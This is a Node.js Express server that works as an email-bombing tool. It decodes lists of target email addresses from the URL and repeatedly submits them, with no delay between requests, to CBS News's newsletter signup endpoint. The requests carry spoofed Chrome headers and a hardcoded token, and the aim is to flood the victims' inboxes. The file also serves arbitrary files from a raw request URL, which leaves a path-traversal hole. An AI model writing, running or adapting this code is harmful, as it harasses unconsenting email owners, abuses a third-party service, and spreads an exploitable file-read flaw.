import express from 'express';
import fs from 'fs';
import fetch from 'node-fetch';
import path from 'path';

const __dirname = process.cwd();
const app = express();
let num = 0;
let errs = 0;
let stopFlag = false;  // Flag to stop the spam operation

function createDirectory(directoryPath) {
    if (!fs.existsSync(directoryPath)) {
        fs.mkdirSync(directoryPath, { recursive: true });
    }
}

function deleteDirectory(directoryPath) {
    if (fs.existsSync(directoryPath)) {
        fs.rmSync(directoryPath, { recursive: true, force: true });
    }
}

function spam(theemail, directoryPath) {
    if (stopFlag) {
        console.log('Spam operation stopped.');
        deleteDirectory(directoryPath);
        return;
    }

    return fetch('https://www.cbsnews.com/newsletters/xhr/signup', {
        method: 'POST',
        headers: {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'text/plain',
            'cookie': '',
            'dnt': '1',
            'origin': 'https://www.cbsnews.com',
            'priority': 'u=1, i',
            'referer': 'https://www.cbsnews.com/embed/newsletters/widget?v=2287029998c5246c93d6dd038eb30603&subs=m40186',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        },
        body: `{"email":"${theemail}","sub":"m40186,m40183","token":"vDZ3zu26GBfyrHadfFbi0Zvnhfsa_jsBAyPrIbgcy3I","mCodeOptin":"m40183"}`
    })
    .then(() => {
        num++;
        fs.writeFileSync(path.join(directoryPath, 'num.txt'), num.toString());
    })
    .catch((e) => {
        errs++;
        fs.appendFile(path.join(directoryPath, 'errmessages.txt'), e.message + "\n", (err) => {
            if (err) {
                console.error('Error appending data:', err);
            }
        });
    })
    .finally(() => {
        try{
            fs.writeFileSync(path.join(directoryPath, 'errs.txt'), errs.toString());
        } catch(e){
            console.log(e.message);
        }
    });
}

function executeSpam(emails, emailCount, emailsToSpam, basePath, interval) {
    let emailIndex = 0;
    let spamCount = 0;
    const totalSpams = emails.length * emailsToSpam;

    const intervalId = setInterval(() => {
        if (stopFlag || spamCount >= totalSpams) {
            clearInterval(intervalId);
            deleteDirectory(basePath);
            console.log('All emails processed.');
            return;
        }

        const email = emails[emailIndex];
        spam(email, basePath).then(() => {
            spamCount++;
            emailIndex = (emailIndex + 1) % emails.length;
        });
    }, interval);
}

app.use(express.static("static"));

app.get('/sendMail/:id1/:id2/index.html', (req, res) => {
    try {
        stopFlag = false;
        errs = 0;
        num = 0;
        const id1 = Buffer.from(req.params.id1, 'base64').toString('utf-8');
        const id2 = Buffer.from(req.params.id2, 'base64').toString('utf-8');
        const emails = id1.split(',');
        const emailCount = emails.length;
        const emailsToSpam = Number(id2);
        const basePath = path.join(__dirname, "sendMail", req.params.id1, req.params.id2);
        createDirectory(basePath);
        fs.writeFileSync(path.join(basePath, 'num.txt'), "Loading...");
        fs.writeFileSync(path.join(basePath, 'errmessages.txt'), "");
        
        // Define interval in milliseconds
        const interval = 0; // Example: 1000ms = 1 second

        // Execute the spam function without waiting for it
        executeSpam(emails, emailCount, emailsToSpam, basePath, interval);

        res.sendFile(path.join(__dirname, 'spamPages', 'spam.html'));
    } catch (e) {
        res.status(500).send("Sorry, but there was an error. Maybe you put too big of a number. \n\n\n\n" + e);
    }
});

app.get('/sendMail/:id1/:id2/:id3', (req, res) => {
    try{
        res.sendFile(path.join(__dirname, req.url));
    } catch(e){
        res.status(500).send("ERROR: " + e.message)
    }
});

// Endpoint to stop the spam operation
app.post('/stopSpam', (req, res) => {
    stopFlag = true;
    res.send('Spam operation stopped.');
});

// Endpoint to clean up files
app.post('/cleanUp', (req, res) => {
    try {
        const { id1, id2 } = req.body;
        const basePath = path.join(__dirname, "sendMail", id1, id2);
        deleteDirectory(basePath);
        res.send('Cleanup completed.');
    } catch (e) {
        res.status(500).send("Error during cleanup: " + e.message);
    }
});

app.listen(8080, () => {
    console.log('Server is running on port 8080');
});
